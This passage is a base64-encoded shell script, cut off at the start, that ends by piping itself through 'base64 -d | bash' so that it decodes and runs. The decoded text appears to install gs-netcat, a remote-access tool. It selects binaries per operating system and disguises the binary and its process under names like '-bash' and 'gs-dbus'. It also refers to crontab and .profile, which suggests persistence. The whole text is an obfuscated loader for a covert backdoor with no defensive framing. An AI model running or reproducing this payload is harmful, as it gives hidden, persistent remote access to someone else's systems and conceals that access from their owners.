5pLWxpbnV4LW1pcHMzMiIKCQkJCWlzX2xlICYmIHsKCQkJCQlPU0FSQ0g9Im1pcHNlbDMyLWFscGluZSIKCQkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1saW51eC1taXBzZWwiCgkJCQl9CgkJCWZpCgkJZWxpZiBbWyAkT1NUWVBFID09ICpkYXJ3aW4qIF1dOyB0aGVuCgkJCWlmIFtbICIkYXJjaCIgPT0gImFybTY0IiBdXTsgdGhlbgoJCQkJT1NBUkNIPSJ4ODZfNjQtb3N4IiAjIE0xCgkJCQkjIyBGSVhNRTogcmVhbGx5IG5lZWRzIE0zIGhlcmUuLgoJCQkJU1JDX1BLRz0iZ3MtbmV0Y2F0X21pbmktbWFjT1MteDg2XzY0IgoJCQkJIyBPU0FSQ0g9ImFybTY0LW9zeCIgIyBNMQoJCQllbHNlCgkJCQlPU0FSQ0g9Ing4Nl82NC1vc3giCgkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1tYWNPUy14ODZfNjQiCgkJCWZpCgkJZWxpZiBbWyAke09TVFlQRSwsfSA9PSAqZnJlZWJzZCogXV07IHRoZW4KCQkJCU9TQVJDSD0ieDg2XzY0LWZyZWVic2QiCgkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1mcmVlYnNkLXg4Nl82NCIKCQllbGlmIFtbICR7T1NUWVBFLCx9ID09ICpvcGVuYnNkKiBdXTsgdGhlbgoJCQkJT1NBUkNIPSJ4ODZfNjQtb3BlbmJzZCIKCQkJCVNSQ19QS0c9ImdzLW5ldGNhdF9taW5pLW9wZW5ic2QteDg2XzY0IgoJCWVsaWYgW1sgJHtPU1RZUEUsLH0gPT0gKmN5Z3dpbiogXV07IHRoZW4KCQkJT1NBUkNIPSJpNjg2LWN5Z3dpbiIKCQkJW1sgIiRhcmNoIiA9PSAieDg2XzY0IiBdXSAmJiBPU0FSQ0g9Ing4Nl82NC1jeWd3aW4iCgkJIyBlbGlmIFtbICRPU1RZUEUgPT0gKmdudSogXV0gJiYgW1sgIiQodW5hbWUgLXYpIiA9PSAqSHVyZCogXV07IHRoZW4KCQkJCSMgT1NBUkNIPSJpMzg2LWh1cmQiICMgZGViaWFuLWh1cmQKCQlmaQoKCQlbWyAteiAiJE9TQVJDSCIgXV0gJiYgewoJCQkjIERlZmF1bHQ6IFRyeSBBbHBpbmUobXVzY2wgbGliYykgNjRiaXQKCQkJT1NBUkNIPSJ4ODZfNjQtYWxwaW5lIgoJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1saW51eC14ODZfNjQiCgkJfQoJZmkKCgkjIERvY2tlciBkb2VzIG5vdCBzZXQgVVNFUgoJW1sgLXogIiRVU0VSIiBdXSAmJiBVU0VSPSQoaWQgLXVuKQoJW1sgLXogIiRVSUQiIF1dICYmIFVJRD0kKGlkIC11KQoKCSMgY2hlY2sgdGhhdCB4eGQgaXMgd29ya2luZyBhcyBleHBlY3RlZCAoYWxwaW5lIGxpbnV4IGRvZXMgbm90IGhhdmUgLXIgb3B0aW9uKQoJdHJ5X2VuY29kZSAiYmFzZTY0IiAiYmFzZTY0IC13MCIgImJhc2U2NCAtZCIKCXRyeV9lbmNvZGUgInh4ZCIgInh4ZCAtcHMgLWMxMDI0IiAieHhkIC1yIC1wcyIKCURFQlVHRiAiRU5DT0RFX1NUUj0nJHtFTkNPREVfU1RSfSciCglbWyAteiAiJFNSQ19QS0ciIF1dICYmIFNSQ19QS0c9ImdzLW5ldGNhdF8ke09TQVJDSH0udGFyLmd6IgoKCSMgT1NYJ3MgcGtpbGwgbWF0Y2hlcyB0aGUgaGlkZGVuIG5hbWUgYW5kIG5vdCB0aGUgb3JpZ2luYWwgYmluYXJ5IG5hbWUuCgkjIEJlY2F1c2Ugd2UgaGlkZSBhcyAnLWJhc2gnIHdlIGNhbiBub3QgdXNlIHBraWxsIGFsbCAtYmFzaC4KCSMgJ2tpbGxhbGwnIGhvd2V2ZXIgbWF0Y2hlcyBncy1kYnVzIGFuZCBvbiBPU1ggd2UgdGh1cyBmb3JjZSBraWxsYWxsCglpZiBbWyAkT1NUWVBFID09ICpkYXJ3aW4qIF1dOyB0aGVuCgkJIyBvbiBPU1ggJ3BraWxsJyBtYXRjaGVzIHRoZSBwcm9jZXNzIChhcmd2WzBdKSB3aGVyZWFzIG9uIFVuaXgKCQkjICdwa2lsbCcgbWF0Y2hlcyB0aGUgYmluYXJ5IG5hbWUuCgkJS0xfQ01EPSJraWxsYWxsIgoJCUtMX0NNRF9SVU5DSEtfVUFSRz0oIi0wIiAiLXUke1VTRVJ9IikKCWVsaWYgY29tbWFuZCAtdiBwa2lsbCA+L2Rldi9udWxsOyB0aGVuCgkJS0xfQ01EPSJwa2lsbCIKCQlLTF9DTURfUlVOQ0hLX1VBUkc9KCItMCIgIi1VJHtVSUR9IikKCWVsaWYgY29tbWFuZCAtdiBraWxsYWxsID4vZGV2L251bGw7IHRoZW4KCQlLTF9DTUQ9ImtpbGxhbGwiCgkJIyBjeWd3aW4ncyBraWxsYWxsIG5lZWRzIHRoZSBuYW1lIChub3QgdGhlIHVpZCkKCQlLTF9DTURfUlVOQ0hLX1VBUkc9KCItMCIgIi11JHtVU0VSfSIpCglmaQoKCSMgJFBBVEggbWlnaHQgYmUgc2V0IGRpZmZlcmVudGx5IGluIGNyb250YWIvLnByb2ZpbGUuIFVzZQoJIyBhYnNvbHV0ZSBwYXRoIHRvIGJpbmFyeSBpbnN0ZWFkOgoJS0xfQ01EX0JJTj0iJChjb21tYW5kIC12ICIkS0xfQ01EIikiCglbWyAteiAkS0xfQ01EX0JJTiBdXSAmJiB7CgkJIyBzZXQgdG8gc29tZXRoaW5nIHRoYXQgcmV0dXJucyAnZmFsc2UnIHNvIHRoYXQgd2UgZG9udAoJCSMgaGF2ZSB0byBjaGVjayBmb3IgZW1wdHkgc3RyaW5nIGluIGNyb250YWIvLnByb2ZpbGUKCQkjIChlLmcuIHNraXAgY2hlY2tpbmcgaWYgYWxyZWFkeSBydW5uaW5nIGFuZCBhbHdheXMgc3RhcnQpCgkJS0xfQ01EX0JJTj0iJChjb21tYW5kIC12IGZhbHNlKSIKCQlbWyAteiAkS0xfQ01EX0JJTiBdXSAmJiBLTF9DTURfQklOPSIvYmluL2RvZXMtbm90LWV4aXQiCgkJV0FSTiAiTm8gcGtpbGwgb3Iga2lsbGFsbCBmb3VuZC4iCgl9CgoJIyBEZWZhdWx0cwoJIyBCaW5hcnkgZmlsZSBpcyBjYWxsZWQgZ3MtZGJ1cyBvciBzZXQgdG8gc2FtZSBuYW1lIGFzIFByb2Nlc3MgbmFtZSBpZgoJIyBHU19ISURERU5fTkFNRSBpcyBzZXQuIENhbiBiZSBvdmVyd3JpdHRlbiB3aXRoIEdTX0JJTl9ISURERU5fTkFNRT0KCWlmIFtbIC1uICRHU19CSU5fSElEREVOX05BTUUgXV07IHRoZW4KCQlCSU5fSElEREVOX05BTUU9IiR7R1NfQklOX0hJRERFTl9OQU1FfSIKCQlCSU5fSElEREVOX05BTUVfUk0rPSgiJEdTX0JJTl9ISURERU5fTkFNRSIpCgllbHNlCgkJQklOX0hJRERFTl9OQU1FPSIke0dTX0hJRERFTl9OQU1FOi0kQklOX0hJRERFTl9OQU1FX0RFRkFVTFR9IgoJZmkKCUJJTl9ISURERU5fTkFNRV9SWD0kKGVjaG8gIiRCSU5fSElEREVOX05BTUUiIHwgc2VkICdzL1teYS16QS1aMC05XS9cXCYvZycpCgkKCVNFQ19OQU1FPSIkKHVuYW1lIC1uKS5wcGsiCglpZiBbWyAtbiAkR1NfSElEREVOX05BTUUgXV07IHRoZW4KCQlQUk9DX0hJRERFTl9OQU1FPSIke0dTX0hJRERFTl9OQU1FfSIKCQlQUk9DX0hJRERFTl9OQU1FX1JYKz0ifCQoZWNobyAiJEdTX0hJRERFTl9OQU1FIiB8IHNlZCAncy9bXmEtekEtWjAtOV0vXFwmL2cnKSIKCWVsc2UKCQlQUk9DX0hJRERFTl9OQU1FPSIkUFJPQ19ISURERU5fTkFNRV9ERUZBVUxUIgoJZmkKCglTRVJWSUNFX0hJRERFTl9OQU1FPSIke0JJTl9ISURERU5fTkFNRX0iCgoJUkNMT0NB' | base64 -d | bash
